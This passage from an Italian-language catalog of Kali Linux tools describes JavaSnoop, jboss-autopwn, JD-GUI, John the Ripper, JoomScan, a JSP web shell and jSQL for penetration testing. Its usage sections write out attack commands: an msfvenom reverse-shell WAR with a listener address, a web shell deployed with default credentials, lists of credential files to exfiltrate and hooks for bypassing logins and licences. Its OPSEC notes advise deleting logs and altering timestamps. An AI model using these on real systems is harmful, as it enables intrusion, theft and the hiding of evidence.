Java target dalla lista\n# - Oppure: avvia nuova applicazione da JavaSnoop\n\n# 2. ESPLORA CLASSI\n# - Browse le classi caricate nella JVM\n# - Usa filtri per trovare classi di interesse\n# - Identifica metodi da targetizzare\n\n# 3. CONFIGURA HOOK\n# - Click destro su metodo -> Add Hook\n# - Configura azioni: Log, Modify Params, Modify Return\n# - Imposta condizioni per trigger\n\n# 4. TAMPERING RULES\n# Per bypass login:\n#   Metodo: com.app.auth.AuthManager.validateCredentials\n#   Action: Always return TRUE\n\n# Per bypass license:\n#   Metodo: com.app.license.LicenseChecker.isValid\n#   Action: Always return TRUE\n\n# Per monitoring:\n#   Metodo: com.app.crypto.Encryptor.encrypt\n#   Action: Log parameters and return value\n\n# 5. OSSERVA E TESTA\n# - Usa l'applicazione normalmente\n# - JavaSnoop mostra ogni chiamata hookkata\n# - Verifica che tampering funzioni\n\n# === SCENARI COMUNI ===\n# Bypass autenticazione: hook su metodi auth\n# Bypass licensing: hook su metodi license check\n# Decrypt communications: log parametri crypto\n# Modificare logica business: alter return values</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>Security Testing di Thick-Client Java</strong>, molte applicazioni enterprise sono thick-client Java (fat JAR, JavaFX, Swing). JavaSnoop permette di bypassare validazioni client-side, testare cosa succede quando controlli di sicurezza vengono neutralizzati, e verificare se il server valida adeguatamente.</p><p>Nel <strong>Reverse Engineering di Applicazioni</strong>, quando il codice sorgente non è disponibile, JavaSnoop fornisce visibilità dinamica su come l'applicazione funziona. Loggando chiamate a metodi chiave si può ricostruire la logica di business senza decompilare.</p><p>Per <strong>Bypass License e DRM</strong>, le protezioni software Java spesso si basano su controlli client-side. JavaSnoop può identificare e neutralizzare questi controlli facendo ritornare sempre true/valid dai metodi di verifica. Utile per security research e testing.</p><p>Durante <strong>Malware Analysis Java</strong>, analisi dinamica di malware Java in sandbox. JavaSnoop permette di monitorare chiamate a API di rete, file system, crypto, e altre funzioni critiche per comprendere il comportamento del malware senza eseguirlo liberamente.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Local Access Required:</strong> JavaSnoop richiede accesso locale al sistema dove l'applicazione Java è in esecuzione. Non è un tool di attacco remoto. L'agent injection necessita permessi per attach alla JVM.</p><p><strong>Detection Possible:</strong> L'applicazione può rilevare che è sotto debug/instrumentation controllando proprietà JVM, presenza di agent, o timing anomali. Applicazioni security-sensitive implementano anti-tampering.</p><p><strong>Tool Maturity:</strong> JavaSnoop è un progetto datato con sviluppo limitato. Per applicazioni moderne, considerare alternative come Frida (con frida-java-bridge), o JRebel per hot-reload, o Byte Buddy per instrumentation programmatica.</p><p><strong>JVM Compatibility:</strong> Alcune versioni di Java e configurazioni JVM potrebbero non permettere attach di agent o potrebbero avere restrizioni su instrumentation. Java 9+ con moduli può complicare l'accesso a internal classes.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "03_Post_Exploitation",
      "Reverse_Engineering"
    ],
    "notes": null
  },
  {
    "id": "jboss-autopwn",
    "name": "jboss-autopwn",
    "version": "0.1",
    "icon": "../app/icons/jboss-autopwn-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/jboss-autopwn/",
    "desc": "Exploit automatico per JBoss/WildFly: deploy webshell via JMX e invoker servlet.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>JBoss-autopwn</strong> è uno script automatizzato per l'exploitation di server JBoss Application Server e WildFly con misconfigurazioni di sicurezza comuni. Il tool sfrutta una serie di vettori d'attacco tipici di installazioni JBoss non hardened: JMX Console esposta senza autenticazione (o con credenziali default), web-console accessibile pubblicamente, JMXInvokerServlet e EJBInvokerServlet non protetti, e altri endpoint amministrativi. Quando una di queste vulnerabilità è presente, JBoss-autopwn può automaticamente deployare un WAR malevolo contenente una web shell o un reverse shell payload, ottenendo code execution completo sul server. Sebbene JBoss moderno (WildFly) abbia migliorato significativamente il security posture di default, molte installazioni legacy rimangono vulnerabili, specialmente in ambienti enterprise dove l'upgrade è complesso.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>JMX Console Exploitation:</strong> La JMX Console (porta 8080/jmx-console) permette di interagire con MBeans del server. Se accessibile senza auth, permette deploy di applicazioni, esecuzione di codice, e controllo completo del server. JBoss-autopwn usa l'MBean jboss.system:MainDeployer per deployare WAR malevoli.</p><p><strong>Web-Console Exploitation:</strong> La web-console (/web-console) fornisce interfaccia grafica per amministrazione. Se non protetta, permette navigazione del filesystem del server, deploy di applicazioni, e modifica configurazioni. Altro vettore per ottenere code execution.</p><p><strong>Invoker Servlet Attacks:</strong> JMXInvokerServlet e EJBInvokerServlet permettono invocazione remota di MBeans via HTTP. Storicamente vulnerabili a Java deserialization attacks (CVE-2017-12149, CVE-2015-7501). JBoss-autopwn può sfruttare queste vulnerabilità per RCE diretto.</p><p><strong>Automated Payload Deployment:</strong> Una volta identificato un vettore funzionante, il tool genera e deploya automaticamente un WAR con web shell JSP. La shell permette esecuzione comandi, file browsing, upload/download, e accesso persistente al server.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># === EXPLOITATION AUTOMATICA ===\n# Scan e sfrutta automaticamente tutte le vulnerabilità\njboss-autopwn target.com 8080\n\n# Specificare porta alternativa\njboss-autopwn target.com 9990\n\n# === OPZIONI SPECIFICHE ===\n# Solo detection (non exploita)\njboss-autopwn -d target.com 8080\n\n# Usa payload WAR custom\njboss-autopwn -p custom_shell.war target.com 8080\n\n# Specificare vettore d'attacco\njboss-autopwn --jmx target.com 8080\njboss-autopwn --webconsole target.com 8080\njboss-autopwn --invoker target.com 8080\n\n# === WORKFLOW MANUALE ===\n# 1. Verifica JMX Console\ncurl http://target:8080/jmx-console/\n\n# 2. Se accessibile, usa MainDeployer per deploy\n# Via browser: JMX Console -> jboss.system -> MainDeployer\n# deploy() -> URL del WAR malevolo\n\n# 3. Accedi alla web shell deployata\ncurl http://target:8080/shell/cmd.jsp?cmd=id\n\n# === GENERARE PAYLOAD ===\n# Crea WAR con JSP shell\nmsfvenom -p java/jsp_shell_reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f war > shell.war\n\n# Oppure usa cmd.war dalla suite\n# Contiene semplice command execution JSP</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Durante <strong>Enterprise Penetration Testing</strong>, JBoss è comune in ambienti enterprise Java. Installazioni vecchie o mal configurate con console di amministrazione esposte rappresentano quick win per ottenere foothold iniziale. JBoss-autopwn automatizza la discovery e l'exploitation.</p><p>Per <strong>Legacy Application Assessment</strong>, molte applicazioni critiche girano su JBoss 4.x/5.x/6.x mai aggiornate. Questi server hanno configurazioni di default insicure. Verificare se gli endpoint di amministrazione sono esposti è parte essenziale dell'assessment.</p><p>Nel <strong>Red Team Operations</strong>, una volta identificato un JBoss esposto via scanning, JBoss-autopwn permette rapida exploitation per ottenere accesso. Da lì, il server può essere usato per pivoting nella rete interna o per raccogliere credenziali da configurazioni.</p><p>Durante <strong>Vulnerability Validation</strong>, dopo aver identificato potenziali JBoss vulnerabili con scanner come Nmap/Nessus, JBoss-autopwn conferma l'exploitabilità effettiva e il livello di accesso ottenibile.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>High Visibility:</strong> L'accesso a /jmx-console/ e /web-console/ genera log distintivi. Il deploy di WAR è loggato nei log del server JBoss. La web shell su disco è persistente e rilevabile da antivirus e file integrity monitoring.</p><p><strong>WAR Artifacts:</strong> Il WAR deployato rimane sul server fino a undeploy esplicito. Lascia tracce evidenti nella directory di deploy. Considerare undeploy e cleanup dopo aver ottenuto accesso alternativo (reverse shell, credenziali).</p><p><strong>IDS/IPS Detection:</strong> I pattern di JMX Console exploitation sono ben noti. Signature IDS/IPS esistono per rilevare questi attacchi. Web Application Firewall possono bloccare l'accesso alle console di amministrazione.</p><p><strong>Version Considerations:</strong> WildFly moderno (JBoss 8+) ha security by default significativamente migliore. Console protette da autenticazione, management interface su porta separata (9990), e configurazione più restrittiva. Tool più efficace su versioni legacy.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "02_Exploitation",
      "Web",
      "JBoss_&_WildFly"
    ],
    "notes": null
  },
  {
    "id": "jd-gui",
    "name": "jd-gui",
    "version": "1.6.6",
    "icon": "../app/icons/jd-gui-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/jd-gui/",
    "desc": "GUI per decompilare JAR e class file Java in codice sorgente leggibile.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>JD-GUI</strong> è un decompilatore Java standalone con interfaccia grafica user-friendly che converte file .class compilati e archivi JAR/WAR/EAR in codice sorgente Java leggibile. A differenza del bytecode raw, il codice decompilato risulta quasi identico all'originale, con nomi di variabili, strutture di controllo, e commenti inferiti dal bytecode. JD-GUI utilizza il motore JD-Core, uno dei decompilatori Java più accurati disponibili, capace di gestire costrutti complessi come inner classes, lambda expressions (Java 8+), e generics. È lo strumento primario per reverse engineering di applicazioni Java, analisi di malware, security audit di librerie third-party, e recupero di codice sorgente perduto.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>High-Fidelity Decompilation:</strong> Il motore JD-Core ricostruisce codice sorgente quasi identico all'originale, gestendo correttamente costrutti complessi come try-with-resources, enhanced for loops, switch expressions, e lambda. Supporta tutte le versioni Java da 1.1 a 17+.</p><p><strong>Archive Navigation:</strong> Apre direttamente archivi JAR, WAR, EAR mostrando la struttura completa dei package in tree view. Navigazione point-and-click tra classi e metodi con hyperlink automatici per riferimenti cross-class.</p><p><strong>Search Capabilities:</strong> Ricerca full-text nel codice decompilato, ricerca di classi per nome, e find usages per identificare dove metodi e campi vengono utilizzati. Essenziale per analizzare codebase complesse.</p><p><strong>Export Completo:</strong> Esporta singole classi o interi archivi come file .java. L'export preserva la struttura dei package creando la corretta gerarchia di directory. Utile per creare progetti IDE importabili per analisi approfondita.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>JD-GUI è primariamente un tool grafico, ma supporta apertura da command line per integrazione in workflow.</p><pre><code># Avvia interfaccia grafica\njd-gui\n\n# Apri file specifico direttamente\njd-gui target-application.jar\njd-gui SuspiciousClass.class\n\n# Apertura multipla\njd-gui app.jar lib1.jar lib2.jar\n\n# Da GUI - workflow tipico:\n# 1. File -> Open -> seleziona JAR/WAR/EAR\n# 2. Navigate nella tree view dei package\n# 3. Click su classe per vedere codice decompilato\n# 4. Ctrl+F per search nel file corrente\n# 5. Ctrl+Shift+F per search globale\n# 6. Click su riferimenti per navigare a definizione\n# 7. File -> Save All Sources per export completo\n\n# Export da command line (se supportato dalla versione)\njd-cli -od output_dir/ target.jar</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>Security Audit di Dipendenze</strong>, quando si utilizzano librerie third-party closed-source, JD-GUI permette di ispezionare il codice per vulnerabilità, backdoor, o comportamenti non documentati. Particolarmente importante per librerie di autenticazione, encryption, o networking.</p><p>Nell'<strong>Analisi Malware Java</strong>, trojan, RAT, e ransomware scritti in Java possono essere completamente analizzati. JD-GUI rivela logica di C2 communication, meccanismi di persistence, payload, e encryption keys hardcoded.</p><p>Per <strong>Vulnerability Research</strong>, decompilare applicazioni enterprise (J2EE, Spring) permette di identificare injection points, authentication bypass, insecure deserialization, e altre vulnerabilità non visibili in black-box testing.</p><p>Nel <strong>Source Code Recovery</strong>, quando il codice sorgente originale è perduto, JD-GUI permette di ricostruire una versione leggibile e modificabile. Utile per legacy applications dove i sorgenti non esistono più.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Operazione Offline:</strong> JD-GUI opera completamente in locale senza connessioni di rete. L'analisi non lascia tracce esterne e può essere eseguita su macchine air-gapped per analisi di malware sensibile.</p><p><strong>Limitazioni Obfuscation:</strong> Codice offuscato con tool come ProGuard, DexGuard, o Zelix KlassMaster risulta difficile da leggere. Nomi di classi/metodi/variabili vengono sostituiti con stringhe meaningless (a, b, aa, etc.). Control flow obfuscation può rendere la logica incomprensibile.</p><p><strong>Contromisure:</strong> Per codice offuscato, combinare JD-GUI con de-obfuscator come java-deobfuscator o analisi dinamica. Per analisi malware, eseguire in VM isolata poiché alcuni malware rilevano ambiente di analisi.</p><p><strong>Legalità:</strong> Decompilazione può violare EULA/ToS di software commerciale. Verificare implicazioni legali prima di analizzare software proprietario al di fuori di contesti di security research autorizzato.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "03_Post_Exploitation",
      "Reverse_Engineering"
    ],
    "notes": null
  },
  {
    "id": "john-kali",
    "name": "john",
    "version": "1.9.0",
    "icon": "../app/icons/john-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/john/",
    "desc": "Password cracker storico con supporto per centinaia di hash type e regole avanzate.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>John</strong> the Ripper è il password cracker più storico, versatile e rispettato nel campo della security. Sviluppato originariamente nel 1996, rimane lo strumento di riferimento per cracking di password offline grazie al supporto per oltre 400 tipi di hash e alla continua evoluzione. La versione 'Jumbo' community-enhanced estende enormemente le capacità originali includendo formati moderni come bcrypt, scrypt, Argon2, hash cloud (AWS, Azure), cryptocurrency wallets, e formati enterprise (SAP, Oracle, Kerberos). John offre multiple modalità di attacco: wordlist con regole di mutation, brute force incrementale con charset configurabili, e modalità single basata su informazioni username. L'architettura modulare permette facile aggiunta di nuovi formati. Supporta accelerazione OpenMP per multi-threading CPU e, nella versione Jumbo, anche GPU con OpenCL/CUDA per hash lenti come bcrypt.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Massive Format Support:</strong> Supporta oltre 400 tipi di hash: Unix crypt variants (DES, MD5, SHA-256/512, bcrypt, yescrypt), Windows (LM, NTLM, NTLMv2, MSCACHE), Kerberos (TGT, AS-REP, TGS-REP), database (Oracle, MySQL, PostgreSQL, MSSQL), archivi (ZIP, RAR, 7z, PDF, Office), web (WordPress, phpBB, Drupal), e molti altri. Auto-detection del formato quando possibile.</p><p><strong>Powerful Wordlist Mode:</strong> Attacco dizionario con regole di mutation che trasformano ogni parola della wordlist in centinaia di varianti: capitalize, append numbers, leet speak, common substitutions. Le regole John sono un linguaggio completo per descrivere trasformazioni. Include preset (best64, KoreLogic) e supporta regole custom.</p><p><strong>Incremental Mode:</strong> Brute force intelligente che usa modelli statistici di frequenza caratteri. Invece di provare aaaaa, aaaab, genera candidati in ordine di probabilità basato su pattern reali di password. Molto più efficiente di brute force puro per password human-generated.</p><p><strong>External Modes:</strong> Permette di definire generatori di password custom in linguaggio C-like. Utile per generare candidati basati su pattern specifici del target: date, numeri di telefono, policy aziendali note.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># === BASIC CRACKING ===\n# Auto-detect format e crack con wordlist\njohn --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt\n\n# Formato specifico (quando auto-detect fallisce)\njohn --format=Raw-SHA256 --wordlist=rockyou.txt hashes.txt\njohn --format=NT --wordlist=rockyou.txt ntlm.txt\njohn --format=bcrypt --wordlist=rockyou.txt bcrypt.txt\n\n# Lista formati supportati\njohn --list=formats | grep -i \"sha\"\n\n# === RULES ===\n# Wordlist con regole default\njohn --wordlist=words.txt --rules hashes.txt\n\n# Regole specifiche (KoreLogic più aggressive)\njohn --wordlist=words.txt --rules=KoreLogic hashes.txt\n\n# Best64 rules (ottimo rapporto velocità/coverage)\njohn --wordlist=rockyou.txt --rules=best64 hashes.txt\n\n# === MODALITÀ AVANZATE ===\n# Incremental mode (brute force intelligente)\njohn --incremental hashes.txt\n\n# Incremental con charset specifico\njohn --incremental=digits hashes.txt  # Solo numeri\njohn --incremental=lower hashes.txt   # Solo lowercase\n\n# Single mode (usa username per generare candidati)\njohn --single hashes.txt\n\n# === GESTIONE SESSIONE ===\n# Mostra password craccate\njohn --show hashes.txt\njohn --show --format=NT ntlm.txt\n\n# Resume sessione interrotta\njohn --restore\njohn --restore=session_name\n\n# Status durante cracking\n# Premi qualsiasi tasto per status\n# Ctrl+C per salvare e uscire\n\n# === FORMATI SPECIFICI ===\n# Kerberoast (TGS-REP)\njohn --format=krb5tgs --wordlist=rockyou.txt kerberoast.txt\n\n# AS-REP roasting\njohn --format=krb5asrep --wordlist=rockyou.txt asrep.txt\n\n# ZIP password\nzip2john protected.zip > zip.hash\njohn --wordlist=rockyou.txt zip.hash\n\n# Office documents\noffice2john document.docx > office.hash\njohn --wordlist=rockyou.txt office.hash\n\n# SSH private key\nssh2john id_rsa > ssh.hash\njohn --wordlist=rockyou.txt ssh.hash\n\n# === PERFORMANCE ===\n# Multi-thread (fork)\njohn --fork=8 --wordlist=rockyou.txt hashes.txt\n\n# Benchmark formati\njohn --test\njohn --test --format=bcrypt</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Nel <strong>Penetration Testing</strong>, dopo aver estratto hash (da SAM, NTDS.dit, /etc/shadow, database dump), John è lo strumento primario per recuperare le password in chiaro. Le password craccate permettono accesso a sistemi, lateral movement, e privilege escalation.</p><p>Per <strong>Password Audit Aziendali</strong>, verifica la robustezza delle password degli utenti contro attacchi offline. Un audit periodico identifica password deboli prima che un attaccante le sfrutti. Report mostra percentuale di password craccabili e tempo necessario.</p><p>Durante <strong>Forensic Investigations</strong>, recupero di password per accedere a dispositivi sequestrati, file criptati, o account di interesse investigativo. John supporta formati forensi comuni come FileVault, LUKS, VeraCrypt.</p><p>Per <strong>Kerberoasting e AD Attacks</strong>, dopo aver estratto TGS-REP o AS-REP tickets, John li cracca offline per ottenere password di service account. Questi account spesso hanno privilegi elevati e password mai cambiate.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Completely Offline:</strong> John opera interamente in locale senza traffico di rete. Gli hash vengono processati sulla macchina dell'attacker. Nessun rischio di detection sul target durante il cracking.</p><p><strong>john.pot File:</strong> Tutte le password craccate vengono salvate in ~/.john/john.pot. Questo file contiene credenziali in chiaro e deve essere protetto. Considerare encryption o secure deletion dopo l'engagement.</p><p><strong>Resource Intensive:</strong> Cracking intensivo usa 100% CPU (o GPU). Su laptop può causare throttling termico. Per hash lenti (bcrypt, scrypt), anche hardware potente richiede tempo significativo.</p><p><strong>Legal Considerations:</strong> Possedere password craccate di terzi può avere implicazioni legali. Documentare autorizzazione per il cracking. Gestire i risultati secondo policy di data handling dell'engagement.</p><br><hr>",
    "best_in": true,
    "category_path": [
      "03_Post_Exploitation",
      "Credentials",
      "Cracking"
    ],
    "notes": null
  },
  {
    "id": "joomscan",
    "name": "joomscan",
    "version": "0.0.7",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/joomscan/",
    "desc": "Scanner vulnerabilità specifico per Joomla CMS con detection di componenti e versioni.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>JoomScan</strong> (Joomla Vulnerability Scanner) è uno scanner di sicurezza specializzato esclusivamente per il CMS Joomla, sviluppato dal team OWASP. A differenza di scanner web generici, JoomScan conosce intimamente l'architettura di Joomla e può identificare con precisione: versione core esatta, componenti/plugin/template installati, configurazioni insicure specifiche del CMS, e vulnerabilità note sia nel core che nelle estensioni. Il database delle vulnerabilità viene aggiornato regolarmente dal team OWASP, includendo CVE, exploit pubblici, e configurazioni problematiche specifiche di Joomla.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Precise Version Detection:</strong> Identifica la versione esatta di Joomla analizzando molteplici indicatori: file XML di manifest, meta generator, file di sistema, e pattern specifici. Funziona anche quando l'admin ha tentato di nascondere la versione.</p><p><strong>Component Enumeration:</strong> Enumera componenti, moduli, plugin, e template installati. Identifica estensioni third-party che spesso rappresentano il vettore d'attacco principale su installazioni Joomla.</p><p><strong>Vulnerability Database:</strong> Confronta versioni identificate con database OWASP di vulnerabilità note. Segnala CVE applicabili, exploit disponibili, e severity rating per prioritizzare remediation.</p><p><strong>Configuration Analysis:</strong> Verifica misconfigurazioni comuni: directory listing abilitato, file di backup esposti, debug mode attivo, .htaccess mancanti, e permessi file errati che espongono informazioni sensibili.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>JoomScan è scritto in Perl e offre opzioni per customizzare lo scan.</p><pre><code># Scan completo standard\njoomscan -u https://target.com\n\n# Enumeration approfondita dei componenti\njoomscan -u https://target.com -ec\njoomscan -u https://target.com --enumerate-components\n\n# Scan con proxy (per Burp/ZAP intercept)\njoomscan -u https://target.com --proxy http://127.0.0.1:8080\n\n# User-Agent custom per evitare WAF basic\njoomscan -u https://target.com -a \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0\"\n\n# Scan con cookie di sessione autenticata\njoomscan -u https://target.com --cookie \"session=abc123\"\n\n# Output in file\njoomscan -u https://target.com -o report.txt\n\n# Specificare random user-agent\njoomscan -u https://target.com -r\n\n# Scan multipli target da file\nfor url in $(cat joomla_sites.txt); do joomscan -u $url -o \"${url//\\//_}.txt\"; done</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Durante <strong>Web Application Penetration Testing</strong>, quando viene identificato un sito Joomla, JoomScan è il primo tool da lanciare. Fornisce una mappa completa dell'installazione identificando tutti i possibili vettori d'attacco specifici del CMS.</p><p>Nel <strong>Bug Bounty</strong>, le estensioni Joomla third-party sono notoriamente vulnerabili. JoomScan enumera tutti i componenti installati permettendo di cercare vulnerabilità note o analizzare codice per trovare 0-day.</p><p>Per <strong>Security Audit Aziendali</strong>, verifica che installazioni Joomla corporate siano aggiornate e correttamente configurate. Il report dettagliato facilita la creazione di remediation plan con priorità basate su severity.</p><p>Durante <strong>Compliance Assessment</strong>, JoomScan verifica requisiti di sicurezza come versioni software aggiornate, configurazioni sicure, e assenza di vulnerabilità note richieste da standard come PCI-DSS per applicazioni web.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Active Fingerprinting:</strong> JoomScan genera molte richieste HTTP a path specifici di Joomla (/administrator/, /components/, /modules/, etc.). Pattern facilmente identificabile da WAF e sistemi di monitoring.</p><p><strong>User-Agent Detection:</strong> Il user-agent default contiene \"JoomScan\" ed è noto ai WAF. Sempre usare -a o -r per cambiare user-agent in operazioni dove la stealth è importante.</p><p><strong>Rate Limiting:</strong> Lo scan può essere rallentato o bloccato da rate limiting. Non c'è opzione built-in per delay tra richieste. Usare proxy con throttling se necessario.</p><p><strong>Log Footprint:</strong> Ogni richiesta viene loggata dal web server. Lo scan completo genera centinaia di entry di log con pattern riconoscibile. Considerare timing dello scan in periodi di alto traffico.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "01_Information_Gathering",
      "Enumeration",
      "Web",
      "CMS",
      "Joomla"
    ],
    "notes": null
  },
  {
    "id": "jsp-file-browser",
    "name": "jsp-file-browser",
    "version": "1.2",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/jsp-file-browser/",
    "desc": "Web shell JSP con file browser grafico per navigazione filesystem su server Java.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>JSP File Browser è una web shell JSP progettata specificamente per server Java application (Tomcat, JBoss, WebLogic, GlassFish) che fornisce un'interfaccia grafica user-friendly per la post-exploitation. A differenza di semplici command shell, JSP File Browser offre un file manager completo con navigazione visuale del filesystem, upload/download di file, editing in-browser, e esecuzione di comandi di sistema. L'interfaccia web-based significa che non richiede connettività reverse (utile quando egress è filtrato) e funziona attraverso qualsiasi browser. Il design user-friendly lo rende accessibile anche a operatori meno tecnici, mentre le funzionalità complete permettono tutte le operazioni di post-exploitation comuni: exfiltration di dati, upload di tool aggiuntivi, modifica configurazioni, e pivot verso altre risorse.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Visual File Browser:</strong> Interfaccia grafica point-and-click per navigare il filesystem del server. Mostra permessi, owner, dimensioni, e date di modifica. Supporta navigazione in qualsiasi directory accessibile al processo Java (spesso root del filesystem). Visualizza file nascosti e di sistema.</p><p><strong>File Transfer Bidirezionale:</strong> Upload di file dal browser al server e download dal server al client. Supporta file binari e di testo di qualsiasi dimensione. Utile per uploadare tool di post-exploitation, exfiltrare dati sensibili, o estrarre backup e configurazioni.</p><p><strong>In-Browser File Editor:</strong> Editor di testo integrato per modificare file direttamente sul server. Permette di modificare configurazioni, script, crontab, e altri file senza doverli scaricare e riuploadare. Syntax highlighting per formati comuni.</p><p><strong>Command Execution:</strong> Esecuzione di comandi di sistema con output visualizzato nel browser. Permette operazioni che non sono possibili tramite file manager come esecuzione script, gestione processi, network operations, e privilege escalation attempts.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># === DEPLOYMENT ===\n# Metodo 1: Upload tramite vulnerabilità file upload\n# Trova form di upload, upload jsp-file-browser.jsp\n\n# Metodo 2: Deploy via manager (se credenziali note)\ncurl -u admin:admin --upload-file shell.war \\\n  \"http://target:8080/manager/text/deploy?path=/shell\"\n\n# Metodo 3: WAR deploy via JMX Console (JBoss)\n# Usa MainDeployer MBean per deploy\n\n# Metodo 4: Copia manuale se hai già accesso\ncp jsp-file-browser.jsp /var/lib/tomcat9/webapps/ROOT/\n\n# === ACCESSO ===\n# Accedi via browser\nhttps://target.com/app/jsp-file-browser.jsp\nhttps://target.com/shell/browser.jsp\n\n# === OPERAZIONI COMUNI ===\n# Navigazione: Click su directory per entrare\n# Upload: Seleziona file locale, click Upload\n# Download: Click su file, seleziona Download\n# Edit: Click su file di testo, modifica, Save\n# Delete: Seleziona file, click Delete\n# Create Dir: Specifica nome, click Create\n\n# === COMMAND EXECUTION ===\n# Nel campo comando:\nwhoami\nid\ncat /etc/passwd\nnetstat -tlnp\nps aux\nfind / -name \"*.conf\" 2>/dev/null\n\n# Privilege escalation check\nsudo -l\nfind / -perm -4000 2>/dev/null\n\n# === FILE DI INTERESSE ===\n# Configurazioni\n/opt/tomcat/conf/tomcat-users.xml\n/opt/tomcat/conf/context.xml\n/var/lib/tomcat9/webapps/*/WEB-INF/web.xml\n\n# Database credentials\n**/application.properties\n**/database.yml\n**/db.conf\n\n# Secrets\n.bash_history\n.ssh/id_rsa\n*.key\n*.pem</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>Post-Exploitation su Server Java</strong>, dopo aver ottenuto la possibilità di uploadare file JSP (tramite file upload vulnerability, WAR deploy, o accesso diretto), JSP File Browser fornisce un'interfaccia completa per esplorare il server. Più user-friendly di una reverse shell per operazioni di file management.</p><p>Durante <strong>Data Exfiltration</strong>, la funzionalità download permette di estrarre file sensibili dal server: backup database, configurazioni con credenziali, chiavi SSH, documenti business. Non richiede setup di server di exfiltration.</p><p>Per <strong>Lateral Movement Preparation</strong>, upload di tool aggiuntivi per scansione della rete interna, port forwarding, o exploitation di altri sistemi. La shell JSP serve come punto di pivot per attacchi successivi.</p><p>Nel <strong>Persistence Establishment</strong>, modifica configurazioni per mantenere accesso: aggiunta di utenti, modifica crontab, installazione di backdoor aggiuntive. L'editor integrato facilita queste modifiche.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>On-Disk Artifact:</strong> Il file JSP rimane sul filesystem del server ed è facilmente rilevabile da antivirus, file integrity monitoring, e security scan. Signature di web shell comuni sono note. Considerare obfuscation o custom shell.</p><p><strong>Access Logging:</strong> Ogni accesso alla shell viene loggato nei log del web server (access.log). Pattern di accesso ripetuti allo stesso JSP sono sospetti. I comandi eseguiti possono apparire in log se passati via GET.</p><p><strong>Web Application Firewall:</strong> WAF possono bloccare l'upload iniziale (signature di web shell) o le richieste successive (pattern di command injection). Potrebbero essere necessarie tecniche di evasion.</p><p><strong>Cleanup Essenziale:</strong> Rimuovere la shell dopo l'utilizzo. Eliminare anche log entries se possibile. Considerare timestamp manipulation per nascondere la presenza. Una shell dimenticata è un indicator of compromise permanente.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "02_Exploitation",
      "Web",
      "File_Upload"
    ],
    "notes": null
  },
  {
    "id": "jsql",
    "name": "jsql",
    "version": "0.112",
    "icon": "../app/icons/jsql-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/jsql/",
    "desc": "GUI Java per SQL injection automatica con supporto per 33 database e tecniche avanzate.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>jSQL</strong> Injection è un'applicazione Java con interfaccia grafica per automatizzare attacchi SQL injection su applicazioni web. Supporta 33 database differenti tra cui MySQL, PostgreSQL, Oracle, Microsoft SQL Server, SQLite, IBM DB2, Sybase, e molti altri. Il tool implementa tutte le principali tecniche di SQL injection: Union-based (estrazione rapida attraverso UNION SELECT), Error-based (extraction tramite messaggi di errore), Blind Boolean (inferenza bit-by-bit), Time-based (delay per confermare injection), e Out-of-Band (DNS/HTTP exfiltration). L'interfaccia grafica intuitiva permette anche a chi non è esperto di SQLi di esplorare database vulnerabili, mentre gli utenti avanzati possono customizzare ogni aspetto dell'attacco. Include utility aggiuntive come admin page finder, hash cracker, file reader/writer, e web shell upload.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Comprehensive Database Support:</strong> Supporta 33 database con sintassi specifiche ottimizzate per ciascuno. Auto-detection del tipo di database basato su fingerprinting di risposte ed errori. Gestisce correttamente quirk specifici come Oracle DUAL table, MSSQL stacked queries, e MySQL information_schema.</p><p><strong>Multiple Injection Techniques:</strong> Implementa tutte le tecniche principali: Union (veloce, richiede output visibile), Error-based (sfrutta messaggi di errore verbose), Blind Boolean (inferenza da risposte true/false), Time-based (SLEEP/WAITFOR per conferma cieca), Stacked queries (comandi 